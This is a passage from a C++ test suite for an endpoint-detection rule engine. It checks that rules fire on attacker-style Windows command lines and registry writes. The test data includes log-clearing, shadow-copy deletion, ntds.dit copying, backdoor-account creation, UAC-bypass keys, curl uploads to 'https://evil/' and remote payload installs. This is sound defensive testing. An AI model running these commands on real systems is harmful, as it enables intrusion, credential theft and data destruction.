    CHECK(matches("EDR-025", "C:\\Windows\\System32\\wevtutil.exe",
                  "wevtutil cl Security"));
    CHECK(!matches("EDR-025", "C:\\Windows\\System32\\wevtutil.exe",
                   "wevtutil collect Security"));
    CHECK(!matches("EDR-025", "C:\\Tools\\fakewevtutil.exe",
                   "fakewevtutil cl Security"));

    CHECK(matches("EDR-026", "C:\\Windows\\System32\\vssadmin.exe",
                  "vssadmin DELETE    SHADOWS /all /quiet"));
    CHECK(!matches("EDR-026", "C:\\Windows\\System32\\vssadmin.exe",
                   "vssadmin nodelete shadows"));

    CHECK(matches("EDR-027", "C:\\Windows\\System32\\bcdedit.exe",
                  "bcdedit /set {current} nointegritychecks on"));
    CHECK(!matches("EDR-027", "C:\\Windows\\System32\\bcdedit.exe",
                   "bcdedit /set testsigning off"));
    CHECK(matches("EDR-028", "C:\\Windows\\System32\\bcdedit.exe",
                  "bcdedit /set {default} recoveryenabled no"));
    CHECK(!matches("EDR-028", "C:\\Windows\\System32\\bcdedit.exe",
                   "bcdedit /set {default} recoveryenabled yes"));
    CHECK(!matches("EDR-028", "C:\\Windows\\System32\\bcdedit.exe",
                   "bcdedit /enum {default} recoveryenabled no"));

    CHECK(matches("EDR-029", "C:\\Windows\\System32\\msiexec.exe",
                  "msiexec /i https://example.test/payload.msi /quiet"));
    CHECK(!matches("EDR-029", "C:\\Windows\\System32\\msiexec.exe",
                   "msiexec /i C:\\Packages\\approved.msi"));

    CHECK(matches("EDR-030", "C:\\Windows\\Microsoft.NET\\Framework64\\msbuild.exe",
                  "msbuild \"C:\\Users\\Jane Doe\\AppData\\Local\\Temp\\a.csproj\""));
    CHECK(!matches("EDR-030", "C:\\Windows\\Microsoft.NET\\Framework64\\msbuild.exe",
                   "msbuild C:\\src\\legitimate.csproj"));
    CHECK(!matches("EDR-030", "C:\\Tools\\fakemsbuild.exe",
                   "fakemsbuild C:\\Windows\\Temp\\payload.xml"));
}

static void TestNewEdrFeaturesProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });
    auto proc = [&](const char* id, const char* image, const char* command) {
        hits.clear();
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kImage] = image;
        event.fields[field::kCommandLine] = command;
        engine.OnEvent(event);
        return std::find(hits.begin(), hits.end(), id) != hits.end();
    };
    auto reg = [&](const char* id, const char* key) {
        hits.clear();
        Event event;
        event.type = EDR_EVT_REG_WRITE;
        event.fields[field::kType] = "REG_WRITE";
        event.fields[field::kRegKey] = key;
        event.fields[field::kRegValue] = "1";
        engine.OnEvent(event);
        return std::find(hits.begin(), hits.end(), id) != hits.end();
    };

    CHECK(proc("EDR-264", "C:\\Windows\\System32\\ntdsutil.exe",
               "ntdsutil \"ac i ntds\" ifm"));
    CHECK(!proc("EDR-264", "C:\\Tools\\fakestdsutil.exe", "fakestdsutil"));

    CHECK(proc("EDR-265", "C:\\Windows\\System32\\esentutl.exe",
               "esentutl /y C:\\Windows\\NTDS\\ntds.dit /d C:\\temp\\ntds.dit"));
    CHECK(!proc("EDR-265", "C:\\Windows\\System32\\esentutl.exe",
                "esentutl /mh C:\\data\\app.edb"));

    CHECK(proc("EDR-266", "C:\\Windows\\System32\\tscon.exe",
               "tscon 2 /dest:console"));
    CHECK(!proc("EDR-266", "C:\\Tools\\faketscon.exe", "faketscon 2"));

    CHECK(proc("EDR-267", "C:\\Windows\\System32\\cmstp.exe",
               "cmstp.exe /s C:\\temp\\payload.inf"));
    CHECK(!proc("EDR-267", "C:\\Windows\\System32\\cmstp.exe",
                "cmstp.exe /ni C:\\windows\\system32\\cmmgr32.inf"));

    CHECK(proc("EDR-268", "C:\\Windows\\System32\\wbem\\wmic.exe",
               "wmic process call create \"cmd.exe /c calc\""));
    CHECK(!proc("EDR-268", "C:\\Windows\\System32\\wbem\\wmic.exe",
                "wmic process list"));

    CHECK(proc("EDR-269", "C:\\Windows\\System32\\cmd.exe",
               "cmd /c copy C:\\temp\\evil.exe C:\\Windows\\System32\\sethc.exe"));
    CHECK(!proc("EDR-269", "C:\\Windows\\System32\\cmd.exe",
                "cmd /c copy C:\\temp\\readme.txt C:\\temp\\out.txt"));

    CHECK(proc("EDR-270", "C:\\Windows\\System32\\netsh.exe",
               "netsh interface portproxy add v4tov4 listenport=18080 connectaddress=127.0.0.1 connectport=3389"));
    CHECK(!proc("EDR-270", "C:\\Windows\\System32\\netsh.exe",
                "netsh interface portproxy show all"));

    CHECK(reg("EDR-260",
              "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential"));
    CHECK(!reg("EDR-260",
               "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL"));
    CHECK(reg("EDR-261",
              "HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp\\0.0.0.0/18080"));
    CHECK(reg("EDR-262",
              "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\\evil"));
    CHECK(reg("EDR-263",
              "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe"));
}

// New EDR feature detection rules (EDR-304..EDR-307). These fire on the
// derived score fields stamped by the MemoryScannerDetector,
// DriverLoadDetector, FilelessAttackDetector and ApiHookDetector. The
// detectors themselves are opt-in (config sections memory_scanner,
// driver_load, fileless_attack, api_hook, all off by default); the rules
// only match when the enrichment stamps the field.
static void TestNewDetectorProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });

    // Memory scanner rule (EDR-304)
    {
        Event event;
        event.type = EDR_EVT_PROCESS_ACCESS;
        event.fields[field::kType] = "PROCESS_ACCESS";
        event.fields[field::kMemoryScanScore] = "60";
        event.fields[field::kMemoryScanReasons] = "full_memory_access_combo";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-304") != hits.end());
        hits.clear();
    }
    {
        Event event;
        event.type = EDR_EVT_PROCESS_ACCESS;
        event.fields[field::kType] = "PROCESS_ACCESS";
        event.fields[field::kMemoryScanScore] = "45";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-304") == hits.end());
    }

    // Driver load rule (EDR-305)
    {
        Event event;
        event.type = EDR_EVT_SERVICE_INSTALL;
        event.fields[field::kType] = "SERVICE_INSTALL";
        event.fields[field::kDriverScanScore] = "70";
        event.fields[field::kDriverVerdict] = "malicious";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-305") != hits.end());
        hits.clear();
    }
    {
        Event event;
        event.type = EDR_EVT_SERVICE_INSTALL;
        event.fields[field::kType] = "SERVICE_INSTALL";
        event.fields[field::kDriverScanScore] = "49";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-305") == hits.end());
    }

    // Fileless attack rule (EDR-306)
    {
        Event event;
        event.type = EDR_EVT_POWERSHELL_SCRIPT;
        event.fields[field::kType] = "POWERSHELL_SCRIPT";
        event.fields[field::kFilelessScore] = "80";
        event.fields[field::kFilelessTechniques] = "download_execute,obfuscation";
        event.fields[field::kFilelessVerdict] = "malicious";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-306") != hits.end());
        hits.clear();
    }
    {
        Event event;
        event.type = EDR_EVT_POWERSHELL_SCRIPT;
        event.fields[field::kType] = "POWERSHELL_SCRIPT";
        event.fields[field::kFilelessScore] = "49";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-306") == hits.end());
    }

    // API hook rule (EDR-307)
    {
        Event event;
        event.type = EDR_EVT_ETW_TAMPER;
        event.fields[field::kType] = "ETW_TAMPER";
        event.fields[field::kApiHookScore] = "75";
        event.fields[field::kApiHookVerdict] = "malicious";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-307") != hits.end());
        hits.clear();
    }
    {
        Event event;
        event.type = EDR_EVT_ETW_TAMPER;
        event.fields[field::kType] = "ETW_TAMPER";
        event.fields[field::kApiHookScore] = "30";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-307") == hits.end());
    }

    // DLL hijack rule (EDR-308)
    {
        Event event;
        event.type = EDR_EVT_IMAGE_LOAD;
        event.fields[field::kType] = "IMAGE_LOAD";
        event.fields[field::kDllHijackScore] = "82";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-308") != hits.end());
        hits.clear();
    }
    {
        Event event;
        event.type = EDR_EVT_IMAGE_LOAD;
        event.fields[field::kType] = "IMAGE_LOAD";
        event.fields[field::kDllHijackScore] = "60";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-308") == hits.end());
    }

    // Defense evasion rule (EDR-309)
    {
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kDefenseEvasionScore] = "90";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-309") != hits.end());
        hits.clear();
    }
    {
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kDefenseEvasionScore] = "59";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-309") == hits.end());
    }

    // Discovery recon rule (EDR-310)
    {
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kDiscoveryScore] = "75";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-310") != hits.end());
        hits.clear();
    }
    {
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kDiscoveryScore] = "69";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-310") == hits.end());
    }
}

// Detection-gap production rules (EDR-281..EDR-298). Pure rules reusing
// existing telemetry: UAC bypass binaries and registry keys (T1548.002),
// wmic XSL execution (T1220), FTP script transfer (T1041), curl/wget upload
// (T1567.001), impacket tool family (T1021/T1003), account creation and
// admin-group membership (T1136.001/T1098), service creation to user-writable
// paths (T1543.003), rundll32 user-writable DLL load (T1218.011), and
// certutil -split decode (T1140). The EDR-294..298 group covers the
// PortScanDetector enrichment stamp (NET_CONNECT), the AlwaysInstallElevated
// MSI policy, Terminal Server root-key RDP-enablement writes, the RDP NLA
// disable under WinStations\RDP-Tcp, and the LSA DisableRestrictedAdmin
// rewrite under Control\Lsa (the last three from the registry watcher under
// enable_reg_watch). All run on default PROCESS_START telemetry; the
// REG_WRITE pair (EDR-282/283) realistically needs Sysmon IDs 12-14 because
// neither the registry watcher nor the driver interest list covers those
// paths.
static void TestNewGapProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });
    auto proc = [&](const char* id, const char* image, const char* command) {
        hits.clear();
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kImage] = image;
        event.fields[field::kCommandLine] = command;
        engine.OnEvent(event);
        return std::find(hits.begin(), hits.end(), id) != hits.end();
    };
    auto reg = [&](const char* id, const char* key) {
        hits.clear();
        Event event;
        event.type = EDR_EVT_REG_WRITE;
        event.fields[field::kType] = "REG_WRITE";
        event.fields[field::kRegKey] = key;
        event.fields[field::kRegValue] = "1";
        engine.OnEvent(event);
        return std::find(hits.begin(), hits.end(), id) != hits.end();
    };
    auto net = [&](const char* id, const char* score) {
        hits.clear();
        Event event;
        event.type = EDR_EVT_NET_CONNECT;
        event.fields[field::kType] = "NET_CONNECT";
        if (score) event.fields[field::kPortScanScore] = score;
        engine.OnEvent(event);
        return std::find(hits.begin(), hits.end(), id) != hits.end();
    };

    // EDR-281: UAC bypass auto-elevation binaries (basename semantics, any dir).
    CHECK(proc("EDR-281", "C:\\Windows\\System32\\fodhelper.exe", "fodhelper.exe"));
    CHECK(proc("EDR-281", "C:\\Tools\\computerdefaults.exe", "computerdefaults.exe"));
    CHECK(!proc("EDR-281", "C:\\Tools\\fakefodhelper.exe", "fakefodhelper"));
    CHECK(!proc("EDR-281", "C:\\Temp\\FodHelperX.exe", "FodHelperX"));

    // EDR-284: sdclt /kickoffelev UAC bypass.
    CHECK(proc("EDR-284", "C:\\Windows\\System32\\sdclt.exe",
               "sdclt.exe /kickoffelev"));
    CHECK(!proc("EDR-284", "C:\\Windows\\System32\\sdclt.exe", "sdclt.exe /logoff"));
    CHECK(!proc("EDR-284", "C:\\Tools\\sdclt2.exe", "sdclt2.exe /kickoffelev"));

    // EDR-285: wmic XSL script execution via remote or user-writable /format:.
    CHECK(proc("EDR-285", "C:\\Windows\\System32\\wbem\\wmic.exe",
               "wmic os get /format:https://evil.example/x.xsl"));
    CHECK(proc("EDR-285", "C:\\Windows\\System32\\wbem\\wmic.exe",
               "wmic os get /format:C:\\Users\\me\\evil.xsl"));
    CHECK(!proc("EDR-285", "C:\\Windows\\System32\\wbem\\wmic.exe",
                "wmic os get /format:table"));
    CHECK(!proc("EDR-285", "C:\\Windows\\System32\\wbem\\wmic.exe",
                "wmic os get /format:C:\\Windows\\System32\\wbem\\x.xsl"));
    CHECK(!proc("EDR-285", "C:\\Windows\\System32\\wbem\\wmic.exe",
                "wmic os get /format:UsersMe"));

    // EDR-286: ftp script-mode batch transfer.
    CHECK(proc("EDR-286", "C:\\Windows\\System32\\ftp.exe",
               "ftp -s:C:\\Users\\me\\script.txt"));
    CHECK(proc("EDR-286", "C:\\Windows\\System32\\ftp.exe",
               "ftp.exe -s:script.txt host"));
    CHECK(!proc("EDR-286", "C:\\Windows\\System32\\ftp.exe", "ftp -i 10.0.0.1"));
    CHECK(!proc("EDR-286", "C:\\Windows\\System32\\ftp.exe", "ftp x-s:file"));

    // EDR-287: curl/wget upload to a remote host.
    CHECK(proc("EDR-287", "C:\\Windows\\System32\\curl.exe",
               "curl -T payload.bin https://evil/"));
    CHECK(proc("EDR-287", "C:\\Windows\\System32\\curl.exe",
               "wget --post-file=data.bin https://evil/"));
    CHECK(!proc("EDR-287", "C:\\Windows\\System32\\curl.exe",
                "curl -I https://evil/"));
    CHECK(!proc("EDR-287", "C:\\Windows\\System32\\curl.exe",
                "curl --upload-filex https://evil/"));

    // EDR-288: impacket tool family.
    CHECK(proc("EDR-288", "C:\\Python\\python.exe",
               "python wmiexec.py host cmd"));
    CHECK(proc("EDR-288", "C:\\Python\\python.exe",
               "python -m impacket.examples.secretsdump host"));
    CHECK(proc("EDR-288", "C:\\Tools\\smbexec.exe",
               "C:\\Tools\\smbexec.exe -hashes :abc host"));
    CHECK(!proc("EDR-288", "C:\\Tools\\x.exe", "mywmiexecwrapper.py"));
    CHECK(!proc("EDR-288", "C:\\Python\\python.exe", "python script.py"));

    // EDR-289: local account creation.
    CHECK(proc("EDR-289", "C:\\Windows\\System32\\net.exe",
               "net user backdoor P@ss /add"));
    CHECK(proc("EDR-289", "C:\\Windows\\System32\\net.exe",
               "net user backdoor P@ss /add & whoami"));
    CHECK(!proc("EDR-289", "C:\\Windows\\System32\\net.exe", "net user"));
    CHECK(!proc("EDR-289", "C:\\Windows\\System32\\net.exe",
                "net user backdoor P@ss /address"));

    // EDR-290: add account to administrators group.
    CHECK(proc("EDR-290", "C:\\Windows\\System32\\net.exe",
               "net localgroup administrators backdoor /add"));
    CHECK(!proc("EDR-290", "C:\\Windows\\System32\\net.exe",
                "net localgroup administrators"));
    CHECK(!proc("EDR-290", "C:\\Windows\\System32\\net.exe",
                "net localgroup administrators backdoor /address"));
    CHECK(!proc("EDR-290", "C:\\Windows\\System32\\net.exe",
                "net localgroup admins /add; net user x"));

    // EDR-291: service creation to a user-writable path.
    CHECK(proc("EDR-291", "C:\\Windows\\System32\\sc.exe",
               "sc create evil binPath= C:\\Users\\me\\evil.exe"));
    CHECK(proc("EDR-291", "C:\\Windows\\System32\\sc.exe",
               "sc.exe create evil binPath = \"C:\\Temp\\evil.exe\""));
    CHECK(!proc("EDR-291", "C:\\Windows\\System32\\sc.exe", "sc query"));
    CHECK(!proc("EDR-291", "C:\\Windows\\System32\\sc.exe",
                "sc config evil binPath= C:\\Windows\\System32\\x.exe"));
    CHECK(!proc("EDR-291", "C:\\Windows\\System32\\sc.exe",
                "sc create evil binPath= C:\\Windows\\System32\\legit.exe"));
    CHECK(!proc("EDR-291", "C:\\Windows\\System32\\sc.exe",
                "sc create evil binPath= C:\\Program Files\\ok.exe"));

    // EDR-292: rundll32 loading a DLL from a user-writable directory.
    CHECK(proc("EDR-292", "C:\\Windows\\System32\\rundll32.exe",
               "rundll32 C:\\Users\\me\\evil.dll,entry"));
    CHECK(proc("EDR-292", "C:\\Windows\\System32\\rundll32.exe",
               "rundll32 \"C:\\Temp\\evil.dll\",f"));
    CHECK(!proc("EDR-292", "C:\\Windows\\System32\\rundll32.exe",
                "rundll32 C:\\Windows\\System32\\shell32.dll,Control_RunDLL"));
    CHECK(!proc("EDR-292", "C:\\Windows\\System32\\rundll32.exe",
                "rundll32 C:\\Windows\\System32\\Public.dll,x"));
    CHECK(!proc("EDR-292", "C:\\Windows\\System32\\rundll32.exe",
                "rundll32 C:\\Tools\\Template\\plugin.dll,x"));

    // EDR-293: certutil -split decode.
    CHECK(proc("EDR-293", "C:\\Windows\\System32\\certutil.exe",
               "certutil -split -f file.b64 file.exe"));
    CHECK(proc("EDR-293", "C:\\Windows\\System32\\certutil.exe",
               "certutil /split x.b64"));
    CHECK(!proc("EDR-293", "C:\\Windows\\System32\\certutil.exe",
                "certutil -urlcache -split-f"));
    CHECK(!proc("EDR-293", "C:\\Windows\\System32\\certutil.exe",
                "certutil -splitter"));
    CHECK(!proc("EDR-293", "C:\\Windows\\System32\\certutil.exe",
                "certutil -dump"));

    // EDR-282/283: UAC bypass registry keys (Sysmon 12-14 source).
    CHECK(reg("EDR-282",
              "HKU\\S-1-5-21-123\\Software\\Classes\\ms-settings\\Shell\\Open\\command"));
    CHECK(!reg("EDR-282",
               "HKU\\S-1-5-21-123\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\DelegateExecute"));
    CHECK(!reg("EDR-282",
               "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell\\Open"));
    CHECK(reg("EDR-283",
              "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command"));
    CHECK(!reg("EDR-283",
               "HKLM\\Software\\Classes\\mscfile\\shell\\open\\command\\runas"));
    CHECK(!reg("EDR-283",
               "HKLM\\Software\\Classes\\CLSID\\{abc}\\InprocServer32"));

    // EDR-294: port-scan enrichment stamp (PortScanDetector, opt-in). The
    // stamp only ever carries 20..100 (min_distinct_ports >= 5, score =
    // portCount * 4 capped at 100); an unstamped NET_CONNECT or an
    // out-of-range score must not match.
    CHECK(net("EDR-294", "20"));
    CHECK(net("EDR-294", "100"));
    CHECK(!net("EDR-294", nullptr));
    CHECK(!net("EDR-294", "0"));
    CHECK(!net("EDR-294", "5"));

    // EDR-295: AlwaysInstallElevated MSI policy write (registry watcher,
    // HKLM and HKCU roots, value name appended by the watcher).
    CHECK(reg("EDR-295",
              "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated"));
    CHECK(reg("EDR-295",
              "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated"));
    CHECK(!reg("EDR-295",
               "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\DisableMSI"));
    CHECK(!reg("EDR-295",
               "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\AlwaysInstallElevated"));

    // EDR-296: Terminal Server root-key RDP-enablement writes (registry
    // watcher, two filtered value names at the root key). UserAuthentication
    // lives under WinStations\RDP-Tcp (EDR-297) and DisableRestrictedAdmin
    // under Control\Lsa (EDR-298); writes at the TS root key for those two
    // values must NOT match this rule. Bare key and unlisted values stay
    // silent.
    CHECK(reg("EDR-296",
              "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnections"));
    CHECK(reg("EDR-296",
              "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\fSingleSessionPerUser"));
    CHECK(!reg("EDR-296",
               "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\UserAuthentication"));
    CHECK(!reg("EDR-296",
               "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\DisableRestrictedAdmin"));
    CHECK(!reg("EDR-296",
               "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\TSUserEnabled"));
    CHECK(!reg("EDR-296",
               "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"));

    // EDR-297: RDP NLA disable (registry watcher, UserAuthentication value
    // under WinStations\RDP-Tcp). The same value name at the TS root key or
    // elsewhere must not match.
    CHECK(reg("EDR-297",
              "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\UserAuthentication"));
    CHECK(!reg("EDR-297",
               "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\UserAuthentication"));
    CHECK(!reg("EDR-297",
               "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\SecurityLayer"));

    // EDR-298: LSA DisableRestrictedAdmin rewrite (registry watcher, value
    // under Control\Lsa). The driver also watches Control\Lsa but its events
    // carry the parent key path (reg_value = value name), so only the
    // watcher-shaped suffix matches here.
    CHECK(reg("EDR-298",
              "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin"));
    CHECK(!reg("EDR-298",
               "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SecurityPackages"));
    CHECK(!reg("EDR-298",
               "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa"));
}

static void TestMoreGapProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });
    auto proc = [&](const char* id, const char* image, const char* command) {
        hits.clear();
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kImage] = image;
        event.fields[field::kCommandLine] = command;
        engine.OnEvent(event);
        return std::find(hits.begin(), hits.end(), id) != hits.end();
    };

    // EDR-312: shutdown.exe forced shutdown or reboot (T1529).
    CHECK(proc("EDR-312", "C:\\Windows\\System32\\shutdown.exe",
               "shutdown /r /t 0"));
    CHECK(proc("EDR-312", "C:\\Windows\\System32\\shutdown.exe",
               "shutdown.exe -s -t 5"));
    CHECK(!proc("EDR-312", "C:\\Windows\\System32\\shutdown.exe",
                "shutdown /a"));

    // EDR-313: PowerShell restart/stop computer (T1529).
    CHECK(proc("EDR-313",
               "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
               "powershell -c Restart-Computer -Force"));
    CHECK(!proc("EDR-313",
               "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
               "powershell -c Get-Process"));

    // EDR-314: virtualization/sandbox artifact queries (T1497).
    CHECK(proc("EDR-314", "C:\\Windows\\System32\\wbem\\wmic.exe",
               "wmic csproduct get name,version"));
    CHECK(!proc("EDR-314", "C:\\Windows\\System32\\notepad.exe",
                "notepad C:\\temp\\x.txt"));

    // EDR-314B: virtual guest agent processes (T1497).
    CHECK(proc("EDR-314B", "C:\\Windows\\System32\\vboxservice.exe",
               "vboxservice"));
    CHECK(!proc("EDR-314B", "C:\\Windows\\System32\\notepad.exe",
                "notepad C:\\temp\\x.txt"));

    // EDR-315: destructive disk commands (T1561).
    CHECK(proc("EDR-315", "C:\\Windows\\System32\\diskpart.exe",
               "diskpart /s clean.txt"));
    CHECK(proc("EDR-315", "C:\\Windows\\System32\\format.com",
               "format D: /q"));
    CHECK(!proc("EDR-315", "C:\\Windows\\System32\\diskpart.exe",
                "diskpart /s show.txt"));

    // EDR-316: direct remote-access tool launch (T1219).
    CHECK(proc("EDR-316",
               "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe",
               "AnyDesk.exe --start-with-win"));
    CHECK(!proc("EDR-316", "C:\\Windows\\System32\\cmd.exe",
                "cmd /c echo x"));
}

// EDR-339 (canary honeypot) / EDR-340 (hook persistence T1546): the
// production rules must fire exactly on their score bands. Score fields
// are preset manually here — the same contract as
// TestNewDetectorProductionRules — because RuleEngine matches fields,
// not detectors; the stamping itself is covered by the detector suites.
static void TestCanaryHookProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });

    {
        // EDR-339: canary_score 60 -> fires.
        hits.clear();
        Event event;
        event.type = EDR_EVT_FILE_INTEGRITY;
        event.fields[field::kType] = "FILE_INTEGRITY";
        event.fields[field::kSource] = "canary";
        event.fields[field::kFimAction] = "accessed";
        event.fields[field::kFimPath] = "c:\\canary\\salary.docx";
        event.fields[field::kCanaryScore] = "60";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-339") != hits.end());

        // Below the 55 threshold must not fire (regex boundary).
        hits.clear();
        event.fields[field::kCanaryScore] = "45";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-339") == hits.end());

        // Plain FIM events without a canary score never fire it.
        hits.clear();
        Event plain;
        plain.type = EDR_EVT_FILE_INTEGRITY;
        plain.fields[field::kType] = "FILE_INTEGRITY";
        plain.fields[field::kFimAction] = "modified";
        plain.fields[field::kFimPath] = "c:\\watch\\hosts.txt";
        engine.OnEvent(plain);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-339") == hits.end());
    }
    {
        // EDR-340: hook_persist_score 85 -> fires.
        hits.clear();
        Event event;
        event.type = EDR_EVT_REG_WRITE;
        event.fields[field::kType] = "REG_WRITE";
        event.fields[field::kRegKey] =
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
            "\\Image File Execution Options\\sethc.exe\\Debugger";
        event.fields[field::kRegValue] = "C:\\Windows\\System32\\cmd.exe";
        event.fields[field::kHookPersistScore] = "85";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-340") != hits.end());

        // Below threshold must not fire.
        hits.clear();
        event.fields[field::kHookPersistScore] = "40";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-340") == hits.end());

        // Benign registry write without a hook score never fires it.
        hits.clear();
        Event benign;
        benign.type = EDR_EVT_REG_WRITE;
        benign.fields[field::kType] = "REG_WRITE";
        benign.fields[field::kRegKey] =
            "HKLM\\SOFTWARE\\Classes\\CLSID"
            "\\{00000000-0000-0000-0000-000000000000}\\InprocServer32";
        benign.fields[field::kRegValue] =
            "C:\\Windows\\System32\\comctl32.dll";
        engine.OnEvent(benign);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-340") == hits.end());
    }
    {
        // EDR-341: task_abuse_score 70 -> fires; below band silent.
        hits.clear();
        Event event;
        event.type = EDR_EVT_TASK_SCHEDULER;
        event.fields[field::kType] = "TASK_SCHEDULER";
        event.fields[field::kOperationType] = "TASK_REGISTERED";
        event.fields[field::kTaskName] =
            "\\temp\\payload\\run powershell hidden";
        event.fields[field::kTaskAbuseScore] = "70";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-341") != hits.end());
        hits.clear();
        event.fields[field::kTaskAbuseScore] = "45";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-341") == hits.end());

        // Ordinary task without a score never fires it.
        hits.clear();
        Event plain;
        plain.type = EDR_EVT_TASK_SCHEDULER;
        plain.fields[field::kType] = "TASK_SCHEDULER";
        plain.fields[field::kOperationType] = "TASK_REGISTERED";
        plain.fields[field::kTaskName] =
            "\\MicrosoftEdgeUpdateTaskMachineCore";
        engine.OnEvent(plain);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-341") == hits.end());
    }
    {
        // EDR-342: masquerade_score 80 -> fires; below band silent.
        hits.clear();
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kImage] = "C:\\Users\\alice\\svch0st.exe";
        event.fields[field::kMasqueradeScore] = "80";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-342") != hits.end());
        hits.clear();
        event.fields[field::kMasqueradeScore] = "45";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-342") == hits.end());

        // Clean process start without a score never fires it.
        hits.clear();
        Event clean;
        clean.type = EDR_EVT_PROCESS_START;
        clean.fields[field::kType] = "PROCESS_START";
        clean.fields[field::kImage] = "C:\\Windows\\System32\\notepad.exe";
        engine.OnEvent(clean);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-342") == hits.end());
    }
}

// EDR-344 (av tamper T1562.001) / EDR-345 (timestomp T1070.006) /
// EDR-346 (one-liner LSASS dump T1003.001): the production rules must
// fire exactly on their score bands. Score fields are preset manually
// here — the same contract as TestCanaryHookProductionRules — because
